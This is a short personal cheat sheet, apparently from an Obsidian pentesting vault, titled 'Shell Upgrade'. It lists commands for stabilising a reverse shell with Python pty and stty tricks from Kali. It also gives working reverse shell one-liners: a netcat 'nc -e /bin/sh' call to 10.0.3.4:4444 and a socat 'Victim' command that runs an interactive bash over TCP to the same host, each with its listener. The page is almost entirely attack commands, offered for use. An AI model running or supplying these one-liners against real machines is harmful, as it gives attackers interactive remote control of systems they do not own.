---
creation date: December 19th 2022
last modified date: December 19th 2022
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[Shell Upgrade]]  
___

## Description:  


### Python

**In reverse shell


```
$ python3 -c 'import pty; pty.spawn("/bin/bash")'

Ctrl-Z

```
**In Kali

```
$ echo $TERM

$stty -a

$ stty raw -echo

$ fg

```
#**In reverse shell

```
$ reset

$ export SHELL=bash

$ export TERM=xterm-256color

$ stty rows 34 columns 118

python3 -c 'import pty; pty.spawn("/bin/bash")'

```
### Netcat:

```
nc -e /bin/sh 10.0.3.4 4444

nc -lvp 4444

```
### Socat

```
Listen:

socat [file:`tty`,raw,echo=0](file://%60tty%60,raw,echo=0) tcp-listen:4444

Victim:

socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444

```

___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: December 19th 2022 (12:36 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
